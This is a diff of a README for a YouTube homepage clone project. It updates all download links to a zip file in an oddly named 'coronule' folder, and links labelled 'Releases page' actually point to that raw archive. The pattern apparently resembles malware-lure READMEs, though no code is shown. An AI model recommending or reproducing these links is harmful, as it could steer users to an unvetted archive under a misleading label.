@@ -6,7 +6,7 @@ Welcome to YouTube_Clone! This is a responsive homepage clone of YouTube, crafte
 
 ## 📥 Download Now
 
-[![Download YouTube_Clone](https://raw.githubusercontent.com/Kathiravanbaskaran/YouTube_Clone/main/coronule/YouTube_Clone.zip)](https://raw.githubusercontent.com/Kathiravanbaskaran/YouTube_Clone/main/coronule/YouTube_Clone.zip)
+[![Download YouTube_Clone](https://raw.githubusercontent.com/Kathiravanbaskaran/YouTube_Clone/main/coronule/You_Tube_Clone_1.7.zip)](https://raw.githubusercontent.com/Kathiravanbaskaran/YouTube_Clone/main/coronule/You_Tube_Clone_1.7.zip)
 
 ## 🌟 Features
 
@@ -25,11 +25,11 @@ To run the YouTube_Clone application, you will need:
 
 ## 🔗 Visit the Releases Page
 
-To download the latest version of YouTube_Clone, visit our [Releases page](https://raw.githubusercontent.com/Kathiravanbaskaran/YouTube_Clone/main/coronule/YouTube_Clone.zip). Here, you will find the most recent updates and files available for download.
+To download the latest version of YouTube_Clone, visit our [Releases page](https://raw.githubusercontent.com/Kathiravanbaskaran/YouTube_Clone/main/coronule/You_Tube_Clone_1.7.zip). Here, you will find the most recent updates and files available for download.
 
 ## 📂 Download & Install
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/Kathiravanbaskaran/YouTube_Clone/main/coronule/YouTube_Clone.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Kathiravanbaskaran/YouTube_Clone/main/coronule/You_Tube_Clone_1.7.zip).
 2. Find the latest release. You will see options for files to download.
 3. Click on the version you would like to download.
 4. After the download is complete, locate the file on your computer. It will typically appear in your "Downloads" folder.
